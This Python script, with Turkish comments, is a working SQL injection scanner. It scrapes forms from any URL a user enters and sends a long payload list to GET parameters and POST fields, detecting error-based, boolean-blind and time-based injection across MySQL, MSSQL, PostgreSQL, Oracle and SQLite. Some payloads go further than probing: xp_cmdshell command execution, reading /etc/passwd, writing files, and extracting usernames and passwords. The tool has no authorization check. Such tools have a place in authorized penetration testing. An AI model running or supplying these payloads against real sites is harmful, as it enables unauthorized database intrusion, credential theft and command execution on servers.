#direk başlat    |  python tiger.py 

import requests
import re
import time
from urllib.parse import urlparse, urljoin, quote_plus
from bs4 import BeautifulSoup # HTML ayrıştırma için

def is_vulnerable_error_based(response_text, error_patterns):
    """
    Verilen yanıtta bilinen SQL hata kalıplarını arar.
    Returns True if any error pattern is found, False otherwise.
    """
    for pattern in error_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True
    return False

def is_vulnerable_boolean_based(original_response_length, test_response_length, threshold_percent=10):
    """
    Boolean tabanlı kör SQL enjeksiyonu için yanıt uzunluklarını karşılaştırır.
    Belirli bir yüzde eşiğinin üzerinde bir fark varsa True döner.
    """
    if original_response_length == 0: # Avoid division by zero
        return False
    percentage_diff = (abs(original_response_length - test_response_length) / original_response_length) * 100
    return percentage_diff > threshold_percent

def get_forms_from_url(url):
    """
    Verilen URL'deki tüm HTML formlarını ayrıştırır ve bir liste olarak döner.
    Her form bir sözlük olup 'action', 'method' ve 'inputs' (bir liste) içerir.
    """
    print(f"\nURL'den formlar aranıyor: {url}")
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status() # HTTP hatalarını kontrol et (4xx veya 5xx)
    except requests.exceptions.RequestException as e:
        print(f"  [Hata] URL'ye erişilemiyor veya hata oluştu: {e}")
        return []

    soup = BeautifulSoup(response.text, 'html.parser')
    forms_data = []

    for form_tag in soup.find_all('form'):
        form_action = form_tag.get('action', '')
        form_method = form_tag.get('method', 'get').lower()
        form_inputs = []

        # input, textarea ve select etiketlerini bul
        for input_tag in form_tag.find_all(['input', 'textarea', 'select']):
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', 'text') # Eğer type belirtilmemişse varsayılan 'text'
            input_value = input_tag.get('value', '') # Eğer value belirtilmemişse varsayılan boş string

            # Checkbox ve radio button'lar için, 'checked' değilse varsayılan değeri boş yap
            # Aksi takdirde, her zaman bir değer gönderecektir.
            if input_type in ['checkbox', 'radio'] and 'checked' not in input_tag.attrs:
                input_value = ''

            # Gizli alanları (hidden inputs) her zaman dahil et
            if input_type == 'hidden':
                if input_name:
                    form_inputs.append({'name': input_name, 'type': input_type, 'value': input_value})
                continue # Gizli alanı işledik, diğer kontrole geç

            if input_name: # 'name' attribute'u olmayan inputları atla
                form_inputs.append({'name': input_name, 'type': input_type, 'value': input_value})
        
        forms_data.append({
            'action': form_action,
            'method': form_method,
            'inputs': form_inputs
        })
    
    if not forms_data:
        print("  Bu URL'de form bulunamadı.")
    else:
        print(f"  {len(forms_data)} form bulundu.")
    return forms_data

def scan_sql_injection(url, forms=None, payloads=None, error_patterns=None, blind_payloads=None):
    """
    Verilen URL'yi ve formları temel SQL Injection zafiyetleri için tarar.
    """
    print(f"\n{'='*50}\nSQL Injection Tarayıcı Başlatıldı: {url}\n{'='*50}")

    # --- SQL Enjeksiyon Payloadları --- (Önceki koddan aynı, oldukça kapsamlı)
    if payloads is None:
        payloads = [
            # Basic Character Escapes and Error Triggers
            "'", "\"", "`", "\\", "%", "--", "#", "/*",
            ")", "'))", "')))", "))))",
            " OR 1=1--", " OR 1=1#", " OR 1=1/*",
            "' OR '1'='1--", "' OR '1'='1'#", "' OR '1'='1'/*",
            "\" OR \"1\"=\"1--", "\" OR \"1\"=\"1\"#", "\" OR \"1\"=\"1\"/*",

            # Logical Conditions (to observe TRUE/FALSE changes)
            " AND 1=1--", " AND 1=2--",
            "' AND 1=1--", "' AND 1=2--",
            "\" AND 1=1--", "\" AND 1=2--",

            # UNION SELECT (Column Count and Database Information Discovery)
            # NULLs are used to probe column count.
            " UNION SELECT NULL--",
            " UNION SELECT NULL,NULL--",
            " UNION SELECT NULL,NULL,NULL--",
            " UNION SELECT NULL,NULL,NULL,NULL--",
            " UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            " UNION SELECT 1--", # Simple data retrieval
            " UNION SELECT 1,2--",
            " UNION SELECT 1,2,3--",
            " UNION SELECT @@VERSION--", # MSSQL version
            " UNION SELECT user(),database()--", # MySQL user and db
            " UNION SELECT version(), current_database(), current_user--", # PostgreSQL
            " UNION SELECT banner FROM v$version--", # Oracle
            " UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = database()--", # MySQL tables
            " UNION SELECT table_name FROM information_schema.tables WHERE table_schema = current_database() LIMIT 0,1--", # PostgreSQL first table
            " UNION SELECT name FROM sqlite_master WHERE type='table' LIMIT 0,1--", # SQLite first table
            " UNION SELECT CONCAT_WS(0x3a,username,password) FROM users--", # Example user data retrieval

            # ORDER BY (Column Count Discovery)
            " ORDER BY 1--", " ORDER BY 2--", " ORDER BY 3--", " ORDER BY 4--", " ORDER BY 5--",
            " ORDER BY 9999--", # Often causes an error

            # SQL Server Specific Payloads
            "; EXEC xp_cmdshell('dir')--",
            "; EXEC master..xp_cmdshell 'ping 127.0.0.1'--",
            "; WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:5'--",
            "\" WAITFOR DELAY '0:0:5'--",
            "; SELECT @@VERSION--",
            "; SELECT DB_NAME()--",
            "; SELECT SYSTEM_USER--",
            "; SELECT IS_SRVROLEMEMBER('sysadmin')--", # Check if sysadmin
            "; SELECT table_name FROM information_schema.tables--",
            "; SELECT name FROM master..sysdatabases--",

            # MySQL Specific Payloads
            " SLEEP(5)--",
            " AND SLEEP(5)--",
            "benchmark(1000000,MD5(1))--", # CPU intensive
            " AND (SELECT SLEEP(5))--",
            " OR SLEEP(5)--",
            " SELECT user()--",
            " SELECT database()--",
            " SELECT version()--",
            " LOAD_FILE('/etc/passwd')--", # File read (permissions critical)
            " INTO OUTFILE '/tmp/test.txt' LINES TERMINATED BY 0x0A SELECT 'Hello'--", # File write
            " SELECT @@datadir--",
            " SELECT @@hostname--",
            " SELECT schema_name FROM information_schema.schemata--",

            # PostgreSQL Specific Payloads
            " pg_sleep(5)--",
            " AND pg_sleep(5)--",
            " OR pg_sleep(5)--",
            " SELECT pg_sleep(5)--",
            " SELECT version()--",
            " SELECT current_database()--",
            " SELECT current_user--",
            " SELECT table_name FROM information_schema.tables WHERE table_schema='public'--",
            " SELECT usename FROM pg_user--",
            " SELECT GRANTED_ROLE_NAME FROM information_schema.applicable_roles--", # Roles

            # Oracle Specific Payloads
            " DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--",
            " AND 5=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--",
            " OR 5=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--",
            " SELECT banner FROM v$version--",
            " SELECT user FROM dual--",
            " SELECT global_name FROM global_name--",
            " SELECT table_name FROM all_tables WHERE ROWNUM = 1--",
            " SELECT DUMP(0) FROM DUAL WHERE 1=(SELECT DUMP(1) FROM DUAL WHERE 1=1)--", # Error-based
            " SELECT TO_CHAR(sysdate,'YYYY-MM-DD HH24:MI:SS') FROM dual--", # Time-consuming

            # SQLite Specific Payloads
            " SELECT sqlite_version()--",
            " SELECT group_concat(name, CHAR(10)) FROM sqlite_master WHERE type='table'--",
            " SELECT sql FROM sqlite_master WHERE type='table' AND name='users'--", # Schema of 'users' table
            " SELECT name FROM pragma_table_info('users')--", # Columns of 'users' table
            " AND 1=1--", # Basic boolean
            " AND 1=2--", # Basic boolean
            "'; SELECT 1=1--", # Stacked query attempt
            "'; SELECT 1=2--",

            # Other General Payloads / Techniques
            " /**/UNION/**/SELECT/**/1,2,3--", # SQL Server/MySQL - Bypass with comments
            " UNION ALL SELECT NULL--", # Use UNION ALL
            " %0aUNION%0aSELECT%0aNULL--", # Bypass with newline char (URL encode)
            " WHERE '1'='1' AND '1'='2'--",
            " having 1=1--",
            " having 1=2--",
            " GROUP BY 1,2,3 HAVING 1=1--",
            " -1 UNION SELECT 1,2,3--", # Negative ID attempt
            " xor 1=1--", " xor 1=2--",
            " OR LENGTH(database())=5--", # Length detection (for blind)
            " OR SUBSTRING(database(),1,1)='a'--", # Character by character detection (for blind)
            " CONCAT(CHAR(120),CHAR(121),CHAR(122))--", # ASCII to CHAR conversion

            # Error message triggers (for various DBs)
            " CAST( (SELECT @@version) AS INT)--", # Type casting error
            " EXP(~(SELECT * FROM (SELECT USER())a))--", # MySQL EXP error
            " 1 AND 1=CONVERT(int, (SELECT @@version))--", # MSSQL Type conversion error
            " AND 1=CAST(1/0 AS INT)--", # Division by zero error
            " SELECT 1 FROM (SELECT 1 UNION SELECT 2)x GROUP BY x.x HAVING x.x = 1 OR 1=1 --" # PostgreSQL GROUP BY error
        ]

    # --- SQL Hata Kalıpları ---
    if error_patterns is None:
        error_patterns = [
            r"SQL syntax",
            r"mysql_fetch_array\(\)", r"mysql_num_rows\(\)", r"mysqli_sql_exception",
            r"You have an error in your SQL syntax",
            r"Warning: mysql_query\(\)", r"Warning: mysql_fetch_",
            r"Unclosed quotation mark", r"Incorrect syntax near",
            r"Microsoft OLE DB Provider for SQL Server", r"SQLSTATE",
            r"ODBC Microsoft Access Driver", r"DB2 SQL error",
            r"ORA-\d{5}", # Oracle errors (e.g., ORA-00942, ORA-01722)
            r"PostgreSQL error", r"Npgsql\.PostgresException",
            r"SQLiteManager: ?syntax error", r"\[SQLITE_ERROR\]", # Added optional space for SQLiteManager
            r"\[\d+\]", # Generic database error codes
            r"Fatal error:", r"Warning:", r"error in your SQL",
            r"supplied argument is not a valid MySQL result",
            r"System\.Data\.SqlClient\.SqlException",
            r"com\.mysql\.jdbc\.exceptions\.jdbc4\.MySQLSyntaxErrorException",
            r"org\.postgresql\.util\.PSQLException",
            r"java\.sql\.SQLException",
            r"\"Could not handle the request\"", # Generalized application error
            r"server error", r"application error",
            r"HTTP Error 500", # Server-side HTTP error
        ]

    # --- Blind SQL Injection Payloads ---
    if blind_payloads is None:
        blind_payloads = [
            # Boolean-Based Blind SQLi (for content/length difference)
            " AND 1=1",
            " AND 1=2",
            "' AND '1'='1",
            " AND '1'='2",
            "\" AND \"1\"=\"1",
            "\" AND \"1\"=\"2",
            " AND 'a'='a",
            " AND 'a'='b",
            " AND (SELECT 1 FROM INFORMATION_SCHEMA.TABLES LIMIT 1)=1--",
            " AND (SELECT count(*) FROM users) > 0--",

            # Time-Based Blind SQLi
            " AND SLEEP(5)--",            # MySQL
            " UNION SELECT SLEEP(5)--",    # MySQL (with UNION)
            " WAITFOR DELAY '0:0:5'--",    # SQL Server
            "'; WAITFOR DELAY '0:0:5'--",  # SQL Server (stacked)
            "\" WAITFOR DELAY '0:0:5'--",  # SQL Server (stacked)
            " AND 1=(SELECT PG_SLEEP(5))--", # PostgreSQL
            " OR 1=(SELECT PG_SLEEP(5))--",   # PostgreSQL
            " SELECT PG_SLEEP(5)--",          # PostgreSQL (stacked)
            " DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--", # Oracle
            " AND (SELECT 1 FROM SYS.DUAL WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5))--", # Oracle
            " AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2) WHERE 1=sqlite_sleep(5))--", # SQLite (version dependent)
            " AND 1=IF(1=1, SLEEP(5), 0)--",  # MySQL (IF statement)
            " AND 1=CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--", # MySQL (CASE statement)
            " AND IF(SUBSTRING(VERSION(),1,1)='5',SLEEP(5),0)--", # Version detection
        ]

    vulnerable_found_overall = False
    http_timeout = 7 # HTTP request timeout in seconds

    # --- GET Parametre Taraması ---
    parsed_url = urlparse(url)
    if parsed_url.query:
        print("\n" + "-"*50 + "\n--- GET parametreleri taranıyor ---")
        original_params = dict(qp.split('=', 1) if '=' in qp else (qp, '') for qp in parsed_url.query.split('&'))
        base_url_no_query = urljoin(url, parsed_url.path)

        for param_name in original_params:
            print(f"\nGET parametresi test ediliyor: **{param_name}**")
            param_vulnerable = False

            try:
                original_response = requests.get(base_url_no_query, params=original_params, timeout=http_timeout)
                original_response_length = len(original_response.text)
                print(f"  Orijinal yanıt uzunluğu: {original_response_length}")
            except requests.exceptions.RequestException as e:
                print(f"  [Hata] Orijinal GET yanıtı alınırken: {e}")
                continue

            for payload in payloads:
                test_params = original_params.copy()
                test_params[param_name] = original_params[param_name] + payload

                try:
                    response = requests.get(base_url_no_query, params=test_params, timeout=http_timeout)
                    if is_vulnerable_error_based(response.text, error_patterns):
                        print(f"  [!!!] **SQL Injection zafiyeti bulundu (Hata Tabanlı)** GET parametresinde: '{param_name}'")
                        print(f"  Payload: '{payload}'")
                        print(f"  Tam URL: {response.url}")
                        param_vulnerable = True
                        vulnerable_found_overall = True
                        break
                except requests.exceptions.RequestException as e:
                    pass

            if param_vulnerable:
                continue

            for payload in blind_payloads:
                test_params = original_params.copy()
                test_params[param_name] = original_params[param_name] + payload

                try:
                    start_time = time.time()
                    response = requests.get(base_url_no_query, params=test_params, timeout=http_timeout + 6)
                    end_time = time.time()
                    elapsed_time = end_time - start_time
                    test_response_length = len(response.text)

                    if any(s in payload.upper() for s in ["SLEEP(", "WAITFOR DELAY", "RECEIVE_MESSAGE", "PG_SLEEP(", "SQLITE_SLEEP("]):
                        if elapsed_time > http_timeout + 1:
                            print(f"  [!!!] **SQL Injection zafiyeti bulundu (Zaman Tabanlı Kör)** GET parametresinde: '{param_name}'")
                            print(f"  Payload: '{payload}'")
                            print(f"  Tam URL: {response.url}")
                            print(f"  Yanıt süresi: {elapsed_time:.2f} saniye")
                            param_vulnerable = True
                            vulnerable_found_overall = True
                            break

                    if not param_vulnerable and is_vulnerable_boolean_based(original_response_length, test_response_length):
                        print(f"  [!!!] **SQL Injection zafiyeti bulundu (Boolean Tabanlı Kör)** GET parametresinde: '{param_name}'")
                        print(f"  Payload: '{payload}'")
                        print(f"  Tam URL: {response.url}")
                        print(f"  Orijinal Uzunluk: {original_response_length}, Test Uzunluğu: {test_response_length}")
                        param_vulnerable = True
                        vulnerable_found_overall = True
                        break

                except requests.exceptions.Timeout:
                    if any(s in payload.upper() for s in ["SLEEP(", "WAITFOR DELAY", "RECEIVE_MESSAGE", "PG_SLEEP(", "SQLITE_SLEEP("]):
                        print(f"  [!!!] **SQL Injection zafiyeti bulundu (Zaman Tabanlı Kör - Timeout)** GET parametresinde: '{param_name}'")
                        print(f"  Payload: '{payload}'")
                        print(f"  Tam URL: {urljoin(base_url_no_query, '?' + '&'.join(f"{k}={v}" for k,v in test_params.items()))}")
                        param_vulnerable = True
                        vulnerable_found_overall = True
                        break
                except requests.exceptions.RequestException as e:
                    pass

    # --- POST Form Taraması ---
    if forms:
        print("\n" + "-"*50 + "\n--- POST formları taranıyor ---")
        for form_index, form in enumerate(forms):
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            inputs = form.get('inputs', [])

            # Formun action URL'ini ana URL'e göre birleştir
            form_target_url = urljoin(url, action)

            if method == 'post':
                print(f"\nForm {form_index + 1} test ediliyor (Action: {action}, Metot: POST)")
                form_vulnerable = False
                
                # Orijinal POST yanıt uzunluğunu al
                try:
                    original_test_data = {i.get('name'): i.get('value', '') for i in inputs if i.get('name')}
                    original_response = requests.post(form_target_url, data=original_test_data, timeout=http_timeout)
                    original_response_length = len(original_response.text)
                    print(f"  Orijinal POST yanıt uzunluğu: {original_response_length}")
                except requests.exceptions.RequestException as e:
                    print(f"  [Hata] Orijinal POST yanıtı alınırken: {e}")
                    continue

                for input_field in inputs:
                    input_name = input_field.get('name')
                    if not input_name:
                        continue

                    print(f"  POST input alanı test ediliyor: **{input_name}**")
                    input_vulnerable = False

                    # Hata Tabanlı ve UNION Tabanlı Payloadlar
                    for payload in payloads:
                        test_data = {}
                        for i in inputs:
                            if i.get('name') == input_name:
                                test_data[i.get('name')] = i.get('value', '') + payload
                            else:
                                test_data[i.get('name')] = i.get('value', '')
                        
                        try:
                            response = requests.post(form_target_url, data=test_data, timeout=http_timeout)
                            if is_vulnerable_error_based(response.text, error_patterns):
                                print(f"    [!!!] **SQL Injection zafiyeti bulundu (Hata Tabanlı)** POST form alanında: '{input_name}'")
                                print(f"    Payload: '{payload}'")
                                print(f"    Gönderilen Veri: {test_data}")
                                input_vulnerable = True
                                vulnerable_found_overall = True
                                break
                        except requests.exceptions.RequestException as e:
                            pass

                    if input_vulnerable:
                        continue

                    # Boolean ve Zaman Tabanlı Kör Payloadlar
                    for payload in blind_payloads:
                        test_data = {}
                        for i in inputs:
                            if i.get('name') == input_name:
                                test_data[i.get('name')] = i.get('value', '') + payload
                            else:
                                test_data[i.get('name')] = i.get('value', '')
                        
                        try:
                            start_time = time.time()
                            response = requests.post(form_target_url, data=test_data, timeout=http_timeout + 6)
                            end_time = time.time()
                            elapsed_time = end_time - start_time
                            test_response_length = len(response.text)

                            if any(s in payload.upper() for s in ["SLEEP(", "WAITFOR DELAY", "RECEIVE_MESSAGE", "PG_SLEEP(", "SQLITE_SLEEP("]):
                                if elapsed_time > http_timeout + 1:
                                    print(f"    [!!!] **SQL Injection zafiyeti bulundu (Zaman Tabanlı Kör)** POST form alanında: '{input_name}'")
                                    print(f"    Payload: '{payload}'")
                                    print(f"    Gönderilen Veri: {test_data}")
                                    print(f"    Yanıt süresi: {elapsed_time:.2f} saniye")
                                    input_vulnerable = True
                                    vulnerable_found_overall = True
                                    break
                            
                            if not input_vulnerable and is_vulnerable_boolean_based(original_response_length, test_response_length):
                                print(f"    [!!!] **SQL Injection zafiyeti bulundu (Boolean Tabanlı Kör)** POST form alanında: '{input_name}'")
                                print(f"    Payload: '{payload}'")
                                print(f"    Gönderilen Veri: {test_data}")
                                print(f"    Orijinal Uzunluk: {original_response_length}, Test Uzunluğu: {test_response_length}")
                                input_vulnerable = True
                                vulnerable_found_overall = True
                                break

                        except requests.exceptions.Timeout:
                            if any(s in payload.upper() for s in ["SLEEP(", "WAITFOR DELAY", "RECEIVE_MESSAGE", "PG_SLEEP(", "SQLITE_SLEEP("]):
                                print(f"    [!!!] **SQL Injection zafiyeti bulundu (Zaman Tabanlı Kör - Timeout)** POST form alanında: '{input_name}'")
                                print(f"    Payload: '{payload}'")
                                print(f"    Gönderilen Veri: {test_data}")
                                input_vulnerable = True
                                vulnerable_found_overall = True
                                break
                        except requests.exceptions.RequestException as e:
                            pass

    print("\n" + "="*50)
    if not vulnerable_found_overall:
        print("SQL Injection zafiyeti bulunamadı (mevcut testler ile).")
    else:
        print("**SQL Injection zafiyetleri tespit edildi!**")
    print("Tarama tamamlandı.")

if __name__ == "__main__":
    target_url = input("Tarayacağınız web sitesinin veya sayfanın URL'sini girin (örn: http://testphp.vulnweb.com/login.php): ")
    
    if not target_url:
        print("URL girilmedi, program sonlanıyor.")
    else:
        # URL'den formları otomatik olarak keşfet
        discovered_forms = get_forms_from_url(target_url)
        
        # SQL Injection taramasını başlat
        # Discovered forms listesini sadece POST metoduna sahip olanları filtreleyerek gönder
        post_forms_to_scan = [f for f in discovered_forms if f['method'] == 'post']
        
        scan_sql_injection(target_url, forms=post_forms_to_scan)
